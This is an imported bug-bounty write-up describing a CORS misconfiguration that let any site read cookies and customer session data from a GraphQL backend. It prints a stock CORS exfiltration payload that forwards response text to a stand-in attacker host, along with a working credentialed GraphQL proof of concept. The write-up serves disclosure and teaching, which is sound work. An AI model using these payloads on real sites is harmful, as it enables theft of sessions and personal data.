---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-12-08_cors-misconfig-on-out-of-scope-domain-bug-bounty-writeup-300-usd-reward-.md
original_filename: 2022-12-08_cors-misconfig-on-out-of-scope-domain-bug-bounty-writeup-300-usd-reward-.md
title: CORS Misconfig on Out of scope domain Bug Bounty Writeup (300 USD Reward )
category: blogs
detected_topics:
- command-injection
- otp
- graphql
- cors
tags:
- imported
- blogs
- command-injection
- otp
- graphql
- cors
language: en
raw_sha256: c36b0eeb6a5aebd8e4687d7c2e288793e3e9c55f3779f470335a2edad2dc20e8
text_sha256: 4a2701faf922e4c0e3872fa9215441bedf624d6f10ffce24c3a16cd1e24b1ff4
ingested_at: '2026-06-28T07:32:16Z'
sensitivity: unknown
redactions_applied: false
---

# CORS Misconfig on Out of scope domain Bug Bounty Writeup (300 USD Reward )

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-12-08_cors-misconfig-on-out-of-scope-domain-bug-bounty-writeup-300-usd-reward-.md
- Source Type: markdown
- Detected Topics: command-injection, otp, graphql, cors
- Ingested At: 2026-06-28T07:32:16Z
- Redactions Applied: False
- Raw SHA256: `c36b0eeb6a5aebd8e4687d7c2e288793e3e9c55f3779f470335a2edad2dc20e8`
- Text SHA256: `4a2701faf922e4c0e3872fa9215441bedf624d6f10ffce24c3a16cd1e24b1ff4`


## Content

---
title: "CORS Misconfig on Out of scope domain Bug Bounty Writeup (300 USD Reward )"
url: "https://jowin922.medium.com/cors-misconfig-on-out-of-scope-domain-bug-bounty-writeup-300-usd-reward-8a9e420d21e0"
authors: ["Eagle_92"]
bugs: ["CORS misconfiguration"]
bounty: "300"
publication_date: "2022-12-08"
added_date: "2022-12-09"
source: "pentester.land/writeups.json"
original_index: 1803
scraped_via: "browseros"
---

# CORS Misconfig on Out of scope domain Bug Bounty Writeup (300 USD Reward )

CORS Misconfig on Out of scope domain Bug Bounty Writeup (300 USD Reward )
jowin922
Follow
2 min read
·
Dec 8, 2022

38

I got an invite to a bug bounty program, the scope of the testing was on app.redacted.com While checking and understanding the login process of the app. I found a CORS vulnerability.

After login is successful, a JS script called /vuln-subdomain/sw.js was loading and it was a sending all the cookies and confidential data to vuln-subdomain.com through GET request where it was stored.

The vuln-subdomain.com has a CORS misconfig and random sites would be able to read data from vuln-subdomain.com. So because of this misconfig the inscope domain app.redacted.com has become vulnerable as it has sent confidential data and cookies to vuln-subdomain.com. The vuln-subdomain.com had graphql and sending a graphql payload through CORS will return sensitive data.

Get jowin922’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I tried the normal CORS payload from payloadallthings which is mentioned below but it didn’t work. I searched why it didn’t work in this case. The output here was by GRAPHQL for the vulnerable subdomain. Payload seemed to not work because the response in this case was not synchronous and there was delay in the response coming.

var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
  location='//atttacker.net/log?key='+this.responseText; 
};

So after some googling, I was able to come up with below POC which successfully read data from vuln-subdomain.com

var createCORSRequest = function(method, url) {
  var xhr = new XMLHttpRequest();
  if ("withCredentials" in xhr) {
  // Most browsers.
  xhr.open(method, url, false);
  xhr.onreadystatechange = function() {
  if (xhr.readyState == XMLHttpRequest.DONE) {
var respons = JSON.parse(JSON.stringify(xhr.responseText))
alert(respons);
  }
}

  } else if (typeof XDomainRequest != "undefined") {
  // IE8 & IE9
  xhr = new XDomainRequest();
  xhr.open(method, url);
  } else {
  // CORS not supported.
  xhr = null;
  }
  return xhr;
};

var url = 'https://vuln-subdomain.com/redacted-backend/graphql';
var method = 'POST';
var xhr = createCORSRequest(method, url);

xhr.onload = function() {
  // Success code goes here.
};

xhr.onerror = function() {
  // Error code goes here.
};

xhr.withCredentials = true;
xhr.send('{"operationName":"GetCurrentCustomerSession","variables":{},"query":"query GetCurrentCustomerSession {\n  getCurrentCustomerSession {\n  chatSession {\n  ...FragmentChatSession\n  __typename\n  }\n  enableRating\n  xmppUser {\n  id\n  username\n  token\n  host\n  __typename\n  }\n  __typename\n  }\n}\n\nfragment FragmentChatSession on ChatSession {\n  id\n  sessionId\n  userCustomer {\n  id\n  name\n  email\n  phoneNumber\n  gender\n  userType {\n  type\n  __typename\n  }\n  comment\n  commentedBy {\n  name\n  __typename\n  }\n  __typename\n  }\n  userBCA {\n  username\n  name\n  {\n  id\n  username\n  host\n  __typename\n  }\n  __typename\n  }\n  chatType {\n  typeName\n  __typename\n  }\n  chatReason {\n  reasonName\n  __typename\n  }\n  sessionSentiment {\n  sentimentType\n  __typename\n  }\n  skill {\n  name\n  published\n  __typename\n  }\n  sessionCategories {\n  categoryName\n  __typename\n  }  }\n}');

The program provided 300 USD bounty for finding this vulnerability.

Press enter or click to view image in full size

Thanks for reading the article. Please subscribe and follow for more web security / Bug Bounty related content.

You can also follow me on twitter @jowin922
